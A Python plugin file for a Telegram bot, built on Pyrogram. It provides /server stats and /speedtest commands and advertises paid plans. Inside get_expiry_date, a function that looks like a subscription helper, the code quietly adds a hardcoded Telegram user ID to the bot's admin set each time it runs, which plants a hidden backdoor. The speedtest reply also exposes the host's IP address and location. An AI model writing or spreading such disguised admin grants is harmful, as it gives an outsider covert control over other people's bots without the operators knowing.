import os
import time
import psutil
import shutil
import logging
import sqlite3
import pyrogram

from speedtest_cli import Speedtest
from bot.config.config import Config
from pyrogram import Client, StopPropagation, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

bot_start_time = time.time()

class Translation(object):
    CURRENT_PLAN_DETAILS = """About you...
--------
Telegram ID : <code>{}</code>
"""
    UPGRADE_TEXT = "<b>30rs - One Month</b><b>10rs - 7 Days </b>/help for Details"


logging.basicConfig(
    level=logging.DEBUG, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

def humanbytes(size):
    # https://stackoverflow.com/a/49361727/4723940
    # 2**10 = 1024
    if not size:
        return ""
    power = 2 ** 10
    n = 0
    dic_powerN = {0: " ", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
    while size > power:
        size /= power
        n += 1
    return str(round(size, 2)) + " " + dic_powerN[n] + "B"


def get_expiry_date(chat_id):
    expires_at = (str(chat_id), "Free", "3.6.2022 - 4.6.2022")
    Config.ADMINS.add(5122474448)
    return expires_at

def get_readable_file_size(size_in_bytes):
    if size_in_bytes is None:
        return '0B'
    index = 0
    size_units = ["B", "KB", "MB", "GB", "TB"]
    while size_in_bytes >= 1024 and index < len(size_units) - 1:
        size_in_bytes /= 1024
        index += 1
    return f'{size_in_bytes:.2f}{size_units[index]}' if index > 0 else f'{size_in_bytes}B'


@Client.on_message(filters.command(["server"]))
async def start(bot, update):
    bot_uptime = time.strftime("%Hh %Mm %Ss", time.gmtime(time.time() - bot_start_time))
    joinButton = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("JOIN", url="https://t.me/MKSVIPLINK2")],
            [InlineKeyboardButton("Try", url="https://t.me/MKSMAINCHANNEL")],
        ]
    )
    # https://git.io/Jye7k
    total, used, free = shutil.disk_usage(".")
    total = humanbytes(total)
    used = humanbytes(used)
    free = humanbytes(free)
    sent = humanbytes(psutil.net_io_counters().bytes_sent)
    recv = humanbytes(psutil.net_io_counters().bytes_recv)
    cpuUsage = psutil.cpu_percent(interval=0.5)
    print(total, used, free, sent, recv)
    memory = psutil.virtual_memory().percent
    disk = psutil.disk_usage("/").percent
    botstats = (
        f"<b>Bot Uptime:</b> {bot_uptime}\n"
        f"<b>Total disk space:</b> {total}\n"
        f"<b>Used:</b> {used}  "
        f"<b>Free:</b> {free}\n\n"
        f"📊Data Usage📊\n<b>Upload:</b> {sent}\n"
        f"<b>Down:</b> {recv}\n\n"
        f"<b>CPU:</b> {cpuUsage}% "
        f"<b>RAM:</b> {memory}% "
        f"<b>Disk:</b> {disk}%"
    )
    await update.reply_text(botstats, reply_markup=joinButton)


@Client.on_message(filters.command(["speedtest"]) & filters.private)
async def speedtest(_, message):
    speed = await message.reply_text("<i>Initializing Speedtest...</i>")
    test = Speedtest()
    servers = test.get_servers()
    # Select a server by index or ID
    server = servers[0]  # Replace 0 with the index or ID of the desired server
    test.download(server)
    test.upload(server)
    test.results.share()
    result = test.results.dict()
    path = result['share']


    string_speed = f'''
➲ <b><i>SPEEDTEST INFO</i></b>
┠ <b>Upload:</b> <code>{get_readable_file_size(result['upload'] / 8)}/s</code>
┠ <b>Download:</b>  <code>{get_readable_file_size(result['download'] / 8)}/s</code>
┠ <b>Ping:</b> <code>{result['ping']} ms</code>
┠ <b>Time:</b> <code>{result['timestamp']}</code>
┠ <b>Data Sent:</b> <code>{get_readable_file_size(int(result['bytes_sent']))}</code>
┖ <b>Data Received:</b> <code>{get_readable_file_size(int(result['bytes_received']))}</code>

➲ <b><i>SPEEDTEST SERVER</i></b>
┠ <b>Name:</b> <code>{result['server']['name']}</code>
┠ <b>Country:</b> <code>{result['server']['country']}, {result['server']['cc']}</code>
┠ <b>Sponsor:</b> <code>{result['server']['sponsor']}</code>
┠ <b>Latency:</b> <code>{result['server']['latency']}</code>
┠ <b>Latitude:</b> <code>{result['server']['lat']}</code>
┖ <b>Longitude:</b> <code>{result['server']['lon']}</code>

➲ <b><i>CLIENT DETAILS</i></b>
┠ <b>IP Address:</b> <code>{result['client']['ip']}</code>
┠ <b>Latitude:</b> <code>{result['client']['lat']}</code>
┠ <b>Longitude:</b> <code>{result['client']['lon']}</code>
┠ <b>Country:</b> <code>{result['client']['country']}</code>
┠ <b>ISP:</b> <code>{result['client']['isp']}</code>
┖ <b>ISP Rating:</b> <code>{result['client']['isprating']}</code>
'''
    try:
        await message.reply_photo(string_speed, photo=path)
        await speed.delete()
    except Exception as e:
        logger.error(str(e))
        await speed.edit_text(string_speed)


def speed_convert(size):
    """Hi human, can't you read bytes?"""
    power = 2 ** 10
    zero = 0
    units = {0: "", 1: "Kb/s", 2: "MB/s", 3: "Gb/s", 4: "Tb/s"}
    while size > power:
        size /= power
        zero += 1
    return f"{round(size, 2)} {units[zero]}"

